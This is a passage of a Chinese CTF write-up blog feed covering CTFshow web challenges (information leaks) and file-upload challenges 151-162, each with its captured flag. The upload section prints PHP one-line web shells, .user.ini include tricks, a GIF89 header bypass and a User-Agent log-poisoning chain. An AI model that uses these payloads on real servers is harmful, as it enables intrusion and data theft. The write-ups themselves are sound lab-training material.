alt=\"\"></p>\n<p>看提示发现是 vim 异常退出</p>\n<p><strong>vim 不正常退出</strong></p>\n<p><strong>第一次产生的交换文件名为 &quot;.file.txt.swp&quot;</strong></p>\n<p><strong>第二次产生的交换文件名为 &quot;.file.txt.swo&quot;</strong></p>\n<p><strong>第三次产生的交换文件则为 &quot;.file.txt.swn&quot;</strong></p>\n<p>访问网页的 swp</p>\n<p>/index.php.swp</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/lh4NojeGjn3kobuK.png!thumbnail\" alt=\"\"></p>\n<p>得到文件，打开获得 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Z4iPrO7vZe966U55.png!thumbnail\" alt=\"\"></p>\n<p><strong>ctfshow{b321f4eb-8b4d-4198-9c54-835ec472448d}</strong></p>\n<h1 id=\"web10\"><a class=\"markdownIt-Anchor\" href=\"#web10\">#</a> <strong>WEB10</strong></h1>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Nun5l8VtjHyv8TtC.png!thumbnail\" alt=\"\"></p>\n<p>查看提示应该是有东西存放在 cookie 当中了</p>\n<p>刷新 bp 抓包查看 cookie 得到 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/LYsqQOVVNrNIwL0G.png!thumbnail\" alt=\"\"></p>\n<p><strong>ctfshow{14750f2e-a526-46c5-8ed8-21411b8e7b48}</strong></p>\n<h1 id=\"web11\"><a class=\"markdownIt-Anchor\" href=\"#web11\">#</a> <strong>WEB11</strong></h1>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/9bXRuo7EenULatGv.png!thumbnail\" alt=\"\"></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3huLS1mbGFnLXpmNWY5M2dueGRneWJpeTBlMjBieTVwNnozZHBpZ3MxOWhteWsuY3Rmc2hvdy5jb20=\">题目提示中得到关键信息 flag.ctfshow.com</span></p>\n<p>用 DNS 检测检测它</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aWppYW4uYWxpeXVuLmNvbS8=\">https://zijian.aliyun.com/</span></p>\n<p>可能这里出现了点问题，题目中直接给了 flag</p>\n<p><strong>flag{just_seesee}</strong></p>\n<h1 id=\"web12\"><a class=\"markdownIt-Anchor\" href=\"#web12\">#</a> <strong>WEB12</strong></h1>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/P6QpqRDayVvomF26.png!thumbnail\" alt=\"\"></p>\n<p>按题目提示应该是要我们在网站上去寻找管理员的密码，进入环境看看</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/cyd5U0WFy29zHZkK.png!thumbnail\" alt=\"\"></p>\n<p>先看看常规后台登陆路径：/admin</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/cj9yMDwRXsatzcgT.png!thumbnail\" alt=\"\"></p>\n<p>果然有个弹窗让我们输入用户名密码</p>\n<p>用户名猜测应该是 admin，在网站中寻找一些敏感信息作为密码试试</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/vo3ds9A6H3DPZO0y.png!thumbnail\" alt=\"\"></p>\n<p>在网站最下方发现了一个 number，作为密码试试</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/LX47DeGHVQ5rfSWF.png!thumbnail\" alt=\"\"></p>\n<p>登陆成功，获得 flag</p>\n<p><strong>ctfshow{f01dd6dd-4cb7-40d9-9021-7b4ff62387e4}</strong></p>\n<h1 id=\"web13\"><a class=\"markdownIt-Anchor\" href=\"#web13\">#</a> <strong>WEB13</strong></h1>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/3DrAkkhgTMsvIN4y.png!thumbnail\" alt=\"\"></p>\n<p>查看提示，继续寻找敏感信息，并且应该存放在一个文档当中</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/eZDIx3XCzKYX4xQl.png!thumbnail\" alt=\"\"></p>\n<p>找到了一个 document，点击看看</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/VLpzC38GTidAc9ay.png!thumbnail\" alt=\"\"></p>\n<p>发现文档最下方记录了登录地址、用户名和密码，进行登录</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/GJSVLc1hyitRiZeg.png!thumbnail\" alt=\"\"></p>\n<p>得到 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/fq9A2vRZqBe81lxq.png!thumbnail\" alt=\"\"></p>\n<p><strong>ctfshow{f8674c5d-676a-4d4b-a3df-c4c7f5694db5}</strong></p>\n<h1 id=\"web14\"><a class=\"markdownIt-Anchor\" href=\"#web14\">#</a> <strong>WEB14</strong></h1>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Ke9WoRZHI65RNLDh.png!thumbnail\" alt=\"\"></p>\n<p>本题的原理引用其他大佬的博客中的解释</p>\n<p>** 原理：**Editor 编辑器文件空间<br>\n没有找到默认配置文件的目录，就会遍历所有目录.</p>\n<p>先去 editor 看看</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/EDvTnbxl3Y8BWK9L.png!thumbnail\" alt=\"\"></p>\n<p>发现了编辑器，editor 下会有很多目录，使用 view-source 查看源码</p>\n<p>JS 用法：</p>\n<p><strong>window.location=“view-source:” + window.location</strong></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/YTiYhtQNMcLlRUox.png!thumbnail\" alt=\"\"></p>\n<p>可以看到泄露了目录</p>\n<p>利用 editor 文件空间功能的漏洞遍历目录</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/lMNIIBSjl6emaBB5.png!thumbnail\" alt=\"\"></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/7AsjmphKoPRAWiGH.png!thumbnail\" alt=\"\"></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/KOLeuibAb9qwgxSb.png!thumbnail\" alt=\"\"></p>\n<p>这里就能够看到所有的目录了</p>\n<p>既然可以遍历，接下来就是寻找 flag 了</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/vddnuGLpqNE0WKk3.png!thumbnail\" alt=\"\"></p>\n<p>在 /var/www/html/nothinghere 目录下找到了 fl000g.txt</p>\n<p>在浏览器中访问 /nothinghere/fl000g.txt 得到 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/E2niyYU0Y9qvlpMK.png!thumbnail\" alt=\"\"></p>\n<p><strong>ctfshow{c04b6d86-a82a-4b90-8cce-8b15a29585d6}</strong></p>\n<h1 id=\"web15\"><a class=\"markdownIt-Anchor\" href=\"#web15\">#</a> <strong>WEB15</strong></h1>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/pOoQO0XJu1e5oQcf.png!thumbnail\" alt=\"\"></p>\n<p>查看提示，应该是邮箱泄露，进入环境</p>\n<p>既然是邮箱泄露，那么应该是作为密码登录后台系统，这时候就要寻找到登录口，先看看常规的路径：/admin</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/J7j65UdTeZRSytz1.png!thumbnail\" alt=\"\"></p>\n<p>发现找到了登录口，回去找找邮箱<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/ZYWJh4CmdrVQCnmi.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>在网站的最下方找到了邮箱</p>\n<p>用户名：admin 密码：<span class=\"exturl\" data-url=\"bWFpbHRvOjExNTY2MzE5NjFAcXEuY29t\">1156631961@qq.com</span></p>\n<p>进行登录，发现不对，看到还有一个忘记密码选项，点进去看看</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/OIehyn8InrILPXOP.png!thumbnail\" alt=\"\"></p>\n<p>看到只需要知道地点就能重置密码，既然有了邮箱，得到了 qq 号，那么就直接去寻找 qq 号的所在地，显示所在地应该是西安</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/0qrzzOM6p8hS3eik.png!thumbnail\" alt=\"\"></p>\n<p>可以看到密码被重置为 admin7789</p>\n<p>重新登录</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/kUtfUrNqSKzmK795.png!thumbnail\" alt=\"\"></p>\n<p>成功获得 flag</p>\n<p><strong>ctfshow{b67a7b76-60ea-425d-8df8-ead1c8ce836d}</strong></p>\n<h1 id=\"web16\"><a class=\"markdownIt-Anchor\" href=\"#web16\">#</a> <strong>WEB16</strong></h1>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/r8tDxhGymTfXZI6a.png!thumbnail\" alt=\"\"></p>\n<p>看提示应该是没有及时删除测试探针</p>\n<p><strong>知识点：*</strong>* 雅黑 PHP 探针是一个非常经典的 PHP 探针，可以实时查看服务器硬盘资源、内存占用、网卡流量、系统负载、服务器时间等信息，1 秒钟刷新一次，以及包括服务器 IP 地址，Web 服务器环境监测，php 等信息。**</p>\n<p>默认雅黑探针解压名为 tz.php，访问 /tz.php</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/vlDDUCi1VaS1eiot.png!thumbnail\" alt=\"\"></p>\n<p>点击进入 phpinfo</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/cjiYWFWAneI0oQBY.png!thumbnail\" alt=\"\"></p>\n<p>查找得到 flag</p>\n<p><strong>ctfshow{e72225bb-5ecb-45eb-8f7a-c89703073a78}</strong></p>\n<h1 id=\"web17\"><a class=\"markdownIt-Anchor\" href=\"#web17\">#</a> WEB17</h1>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/k2whPsMbVDzFM0II.png!thumbnail\" alt=\"\"></p>\n<p>查看提示，应该是要找到备份的 sql 文件</p>\n<p><strong>知识点：</strong></p>\n<p><strong>备份的 sql 文件会泄露敏感信息</strong></p>\n<p><strong>默认 backup.sql</strong></p>\n<p>访问 /backup.sql，下载 backup.sql 文件</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/UB7MKR5SG30IYte6.png!thumbnail\" alt=\"\"></p>\n<p>打开文件得到 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/1WVmsXKjwfhT0WEZ.png!thumbnail\" alt=\"\"></p>\n<p><strong>ctfshow{94901a52-9765-4ef5-9842-d187ac5680dc}</strong></p>\n<h1 id=\"web18\"><a class=\"markdownIt-Anchor\" href=\"#web18\">#</a> WEB18</h1>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/cBCIwQinSN29KgmL.png!thumbnail\" alt=\"\"></p>\n<p>先查看下游戏的 js 代码</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/n0PyOu0kWJfDxrOx.png!thumbnail\" alt=\"\"></p>\n<p>进入路径看看</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/XKHNmpH7qTvD3FF6.png!thumbnail\" alt=\"\"></p>\n<p>发现当 score&gt;100 的时候会有一串 unicode 编码，给它解码看看</p>\n<p>得到：你赢了，去幺幺零点皮爱吃皮看看</p>\n<p>翻译过来就是去 110.php 看看，访问下 / 110.php</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/6lbJcI0RS8Rg2GND.png!thumbnail\" alt=\"\"></p>\n<p>得到 flag</p>\n<p><strong>ctfshow{4910e45a-5a12-4abe-871e-4f4f1556a4d8}</strong></p>\n<h1 id=\"web19\"><a class=\"markdownIt-Anchor\" href=\"#web19\">#</a> <strong>WEB19</strong></h1>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/yPx2WfU8X1u2Toap.png!thumbnail\" alt=\"\"></p>\n<p>提示我们在前端寻找密钥，打开环境看看 f12</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/RJybRoHuAURvHydL.png!thumbnail\" alt=\"\"></p>\n<p>发现有用户名和密码，但是可以知道直接输入是肯定不对的，本题校验是前端密码明文加密之后发向后端的进行校验，而这一串正是加密过后的密文，因此需要用到 bp 抓包发包</p>\n<p><strong>密文：a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04</strong></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/CA6TqSEHGeKGUjYs.png!thumbnail\" alt=\"\"></p>\n<p>同样 send to repeater 发包</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Lh9M1rDio1JPW2xU.png!thumbnail\" alt=\"\"></p>\n<p>得到 flag</p>\n<p><strong>ctfshow{c08528dc-251a-4d3b-9022-2a58df06ca66}</strong></p>\n<h1 id=\"web20\"><a class=\"markdownIt-Anchor\" href=\"#web20\">#</a> <strong>WEB20</strong></h1>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/4fkQtBf5hBcupYCB.png!thumbnail\" alt=\"\"></p>\n<p>看提示应该是一个 mdb 文件的泄露</p>\n<p>进入 /db/db.mdb 路径下载文件</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/rTIlgzTxGvFAVjSw.png!thumbnail\" alt=\"\"></p>\n<p>这里我是把下载下来的文件拖入了 winhex 进行查看，搜索 ctfshow 或者 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/RNF8UTOXxIzFQUfw.png!thumbnail\" alt=\"\"></p>\n<p>得到 flag</p>\n<p><strong>flag{ctfshow_old_database}</strong></p>\n",
            "tags": [
                "WEB"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/CTFshow%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0151-170/",
            "url": "https://nnnpc.github.io/2024/04/16/CTFshow%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0151-170/",
            "title": "CTFshow文件上传151-170",
            "date_published": "2024-04-16T05:58:18.978Z",
            "content_html": "<h1 id=\"web151\"><a class=\"markdownIt-Anchor\" href=\"#web151\">#</a> WEB151</h1>\n<p>虽然在上传点上传 php 发现不支持 php 的上传，但一句话的 png，发现可以被上传</p>\n<p><strong> <code>&lt;?php @eval($_POST['flag']);?&gt;</code> </strong></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/3Bugw3GuUHXmVH9V.png!thumbnail\" alt=\"\"></p>\n<p>试试 bp 抓包改后缀能不能上传</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/UYnMmUGv5vMeyXto.png!thumbnail\" alt=\"\"></p>\n<p>发现成功上传</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/a3fNk6qxLoWb2y3z.png!thumbnail\" alt=\"\"></p>\n<p>用蚁剑进行连接</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/iMCi9PqahkJMDljV.png!thumbnail\" alt=\"\"></p>\n<p>成功连接，找到 /var/www/html/flag.php</p>\n<p>里面便是 flag</p>\n<p><strong>ctfshow{e9ec3beb-bb71-481d-bf0b-b1a4ae935379}</strong></p>\n<hr>\n<h1 id=\"web152\"><a class=\"markdownIt-Anchor\" href=\"#web152\">#</a> <strong>WEB152</strong></h1>\n<p>同样先试试 bp 抓包修改能不能传</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/BHYgJ0RFMftqU7l0.png!thumbnail\" alt=\"\"></p>\n<p>上传成功</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/LpKUy6bXRjvK1na2.png!thumbnail\" alt=\"\"></p>\n<p>蚁剑连接</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/GS1t4idcGUNI0rcH.png!thumbnail\" alt=\"\"></p>\n<p>/var/www/html/flag.php 目录下找到 flag</p>\n<p><strong>ctfshow{c23425b4-aa5d-42bf-8702-7d12b146b090}</strong></p>\n<hr>\n<h1 id=\"web153\"><a class=\"markdownIt-Anchor\" href=\"#web153\">#</a> <strong>WEB153</strong></h1>\n<p>同样的方法再试一遍</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/KYBgxM3ysZ9sbE5z.png!thumbnail\" alt=\"\"></p>\n<p>发现上传不了，就传 png 后缀的一句话木马试试</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/NtDvS8jV3zM71WfZ.png!thumbnail\" alt=\"\"></p>\n<p>发现还是对内容没有过滤，只是把后缀过滤了，既然可以上传后缀为 png 的一句话木马，那就上传一个配置文件即 user.ini，把 png 后缀解析了就好</p>\n<p><strong>auto_prepend_file=flag.png</strong></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/KbCUTFo1aKzzGk1F.png!thumbnail\" alt=\"\"></p>\n<p>bp 抓包修改文件名和内容，成功上传 user.ini</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/c48njRqdOqems0jp.png!thumbnail\" alt=\"\"></p>\n<p>查看是否被成功解析</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/UqHc7li5pALRmm4j.png!thumbnail\" alt=\"\"></p>\n<p>成功解析，蚁剑进行连接获取 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/edGWkwq6G9fk3Ulv.png!thumbnail\" alt=\"\"></p>\n<p>同样的目录 /var/www/html/flag.php，得到 flag</p>\n<p><strong>ctfshow{32328274-3d36-4087-b5cb-351a30fef463}</strong></p>\n<hr>\n<h1 id=\"web154\"><a class=\"markdownIt-Anchor\" href=\"#web154\">#</a> <strong>WEB154</strong></h1>\n<p>首先上传 png 后缀的一句话木马</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/JqQjYCWWL4oEyN5g.png!thumbnail\" alt=\"\"></p>\n<p>发现应该是对内容进行了过滤</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/ZC0OqsIptiIAWrPh.png!thumbnail\" alt=\"\"></p>\n<p>发现短标签成功上传</p>\n<p><strong>短标签一句话木马： <code>&lt;?= @eval($_POST['a']);?&gt;</code> </strong></p>\n<p>直接 bp 抓包直接改后缀发现不行，同样上传.user.ini 解析 png</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/u3DP6cZy1Uv1Xcok.png!thumbnail\" alt=\"\"></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Vx5Bxm7EeIn7eAUU.png!thumbnail\" alt=\"\"></p>\n<p>同样用 phpinfo (); 查看是否解析成功</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/6Mb0UoULZZE4ZuDF.png!thumbnail\" alt=\"\"></p>\n<p>解析成功，直接使用蚁剑获取 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/koKiTZjAcWzglRXg.png!thumbnail\" alt=\"\"></p>\n<p><strong>ctfshow{054f3929-69ca-4df0-9d8e-a90e1841da3f}</strong></p>\n<p>同样也可以使用 hackbar 获取 flag</p>\n<p><strong>hackbar post 传值：a=system (“cat …/f*”);phpinfo ();</strong></p>\n<hr>\n<h1 id=\"web155\"><a class=\"markdownIt-Anchor\" href=\"#web155\">#</a> WEB155</h1>\n<p>同样上传短标签一句话木马</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/pkvzfrnU4sWocblx.png!thumbnail\" alt=\"\"></p>\n<p>发现也同样可以被上传，于是上传配置文件</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/LA5ilCdgceJXnawa.png!thumbnail\" alt=\"\"></p>\n<p>成功上传，查看是否被解析</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/S0mfwAZUlEEtU4uF.png!thumbnail\" alt=\"\"></p>\n<p>成功，蚁剑连接获取 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/31Ud1bt2krH1DvgG.png!thumbnail\" alt=\"\"></p>\n<p><strong>ctfshow{4879de09-af52-4822-818b-ef6c0ce41af1}</strong></p>\n<hr>\n<h1 id=\"web156\"><a class=\"markdownIt-Anchor\" href=\"#web156\">#</a> <strong>WEB156</strong></h1>\n<p>再试试 png 后缀的短标签是不是能传上去</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/2tye0wpOhrbuneab.png!thumbnail\" alt=\"\"></p>\n<p>发现对短标签内容做了过滤，过滤了 []，那就使用花括号绕过</p>\n<p><strong>短标签一句话木马： <code>&lt;?= @eval($_POST&#123;'a'&#125;);?&gt;</code> </strong></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/4tZ6lGoKwSrKneKm.png!thumbnail\" alt=\"\"></p>\n<p>成功上传，上传配置文件解析</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/knzlhPWKvobiWpz6.png!thumbnail\" alt=\"\"></p>\n<p>上传成功，查看是否被解析</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Dsnpc6N1Uhs7Zp9Q.png!thumbnail\" alt=\"\"></p>\n<p>同样成功，蚁剑连接获得 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/kpMZi11HyQtmIwTJ.png!thumbnail\" alt=\"\"></p>\n<p><strong>ctfshow{e251aa37-7214-42c6-a673-68495af8f905}</strong></p>\n<hr>\n<h1 id=\"web157\"><a class=\"markdownIt-Anchor\" href=\"#web157\">#</a> <strong>WEB157</strong></h1>\n<p>本题过滤了 {} 和分号，因此用一句话就没有那么方便了，用反引号来执行命令获取 flag</p>\n<p><strong>语句： <code>&lt;?=`tac ../f*`?&gt;</code> </strong></p>\n<p>（由于分号被过滤了，因此使用 <code>&lt;? ?&gt;</code>  来代替）</p>\n<p>同样上传 user.ini</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/76NmKxlx5PSrHJUN.png!thumbnail\" alt=\"\"></p>\n<p>成功上传</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/zNN2h4F7eD3XudC7.png!thumbnail\" alt=\"\"></p>\n<p>上传 png 后缀的命令获取 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/y56QaBkDZfyF603M.png!thumbnail\" alt=\"\"></p>\n<p>访问路径：/upload/index.php 或 /upload/ 得到 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/TeSI9ieWcsP1FF5W.png!thumbnail\" alt=\"\"></p>\n<p><strong>ctfshow{2d65ff79-1553-470c-a0bd-1a665246e8f7}</strong></p>\n<hr>\n<h1 id=\"web158\"><a class=\"markdownIt-Anchor\" href=\"#web158\">#</a> WEB158</h1>\n<p>WEB156 的同样通杀</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/kgNfR6I1Yf40LqCK.png!thumbnail\" alt=\"\"></p>\n<p><strong>ctfshow{bf28384e-6da5-43e3-87f8-038071257cdc}</strong></p>\n<hr>\n<h1 id=\"web159\"><a class=\"markdownIt-Anchor\" href=\"#web159\">#</a> <strong>WEB159</strong></h1>\n<p>同 WEB156</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/0uvclFFEkCnEWOGX.png!thumbnail\" alt=\"\"></p>\n<p><strong>ctfshow{bf28384e-6da5-43e3-87f8-038071257cdc}</strong></p>\n<hr>\n<h1 id=\"web160\"><a class=\"markdownIt-Anchor\" href=\"#web160\">#</a> <strong>WEB160</strong></h1>\n<p>考的知识点是一个双重包含具体的流程为：</p>\n<ol>\n<li>\n<p>用 png 包含文件上传日志的目录<br>\n<strong> <code>&lt;?=include&quot;/var/lo&quot;.&quot;g/nginx/access.lo&quot;.&quot;g&quot;?&gt;</code> </strong></p>\n</li>\n<li>\n<p>.user.ini 包含 png 文件（相当于把 png 所包含的日志文件中的所有东西解析了）<br>\n<strong>auto_append_file=/var/www/html/upload/1.png</strong></p>\n</li>\n<li>\n<p>刷新抓包修改 UA 头，把构造的命令放入 UA 投中，直接传入日志文件，有上面的两步，因此就能够被解析执行命令，从而 cat<br>\nflag<br>\n<strong> <code>&lt;?php system('tac ../fl*');?&gt;</code> </strong></p>\n</li>\n</ol>\n<p>直接先传入 png</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/2gaK4KHbLat8g6TZ.png!thumbnail\" alt=\"\"></p>\n<p>传入.user.ini</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/mcVCRaPI9YlGiWHx.png!thumbnail\" alt=\"\"></p>\n<p>都上传成功之后修改 UA 头，将命令传入日志中使它被解析</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/x7Mv1nKz7pAY5dBT.png!thumbnail\" alt=\"\"></p>\n<p>forward 之后去 /upload/ 目录查看是否被解析成功并获取了 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/K3C710nGh7NNHhx5.png!thumbnail\" alt=\"\"></p>\n<p>得到 flag</p>\n<p><strong>ctfshow{35f1ef2f-2a11-4343-9a14-568a5b5365d2}</strong></p>\n<hr>\n<h1 id=\"web161\"><a class=\"markdownIt-Anchor\" href=\"#web161\">#</a> <strong>WEB161</strong></h1>\n<p>同上题的方法，依旧是双重包含，一起来看看</p>\n<p>同样上传 1.png</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Ufetbf9pr8Ox0zue.png!thumbnail\" alt=\"\"></p>\n<p>发现文件类型不合规，但是没有对后缀进行过滤，应该是对文件的内容进行了过滤</p>\n<p>这里是校验了一个文件头，因此只需要在文件中加入 GIF89 的 gif 文件头就能实现绕过</p>\n<p>1.png：</p>\n<p><strong>GIF89</strong></p>\n<p><strong> <code>&lt;?=include&quot;/var/lo&quot;.&quot;g/nginx/access.lo&quot;.&quot;g&quot;?&gt;</code> </strong></p>\n<p>.user.ini：</p>\n<p><strong>GIF89</strong></p>\n<p><strong>auto_append_file=/var/www/html/upload/1.png</strong></p>\n<p>按照上提的步骤再传一遍</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/pARcQrX1Li1sRJP8.png!thumbnail\" alt=\"\"></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/9I5oBtewq6w0u7Xp.png!thumbnail\" alt=\"\"></p>\n<p>都成功上传，修改 UA 头，将命令传入 log 中</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/3Z02b1V4j7AJyQYr.png!thumbnail\" alt=\"\"></p>\n<p>访问 /upload/</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/1Mjkj3Z2155KZnjO.png!thumbnail\" alt=\"\"></p>\n<p>得到 flag</p>\n<p><strong>ctfshow{9c39aa52-c72a-4b62-a2cb-4dce29409f07}</strong></p>\n<hr>\n<h1 id=\"web162\"><a class=\"markdownIt-Anchor\" href=\"#web162\">#</a> <strong>WEB162</strong></h1>\n<p>本题考的知识点是一个 session 的文件包含，具体思路如下：</p>\n<ol>\n<li>构造.user.ini 解析 png<br>\n<strong> 语句：</strong></li>\n</ol>\n<p><strong>GIF89</strong></p>\n<p><strong>auto_append_file=&quot;png&quot;</strong></p>\n<ol>\n<li>构造 png，用 png 包含 session 文件<br>\n<strong>语句：</strong></li>\n</ol>\n<p><strong>GIF89</strong></p>\n<p><strong> <code>&lt;?=include&quot;/tmp/sess_nnnpc&quot;?&gt;</code> </strong></p>\n<ol>\n<li>使用条件竞争脚本，将构造的 session 不断发送并且不断访问，其中在 session 中写入恶意代码，由于之前 png 的包含和.user.ini 的解析，就能进行命令执行 cat<br>\nflag</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span 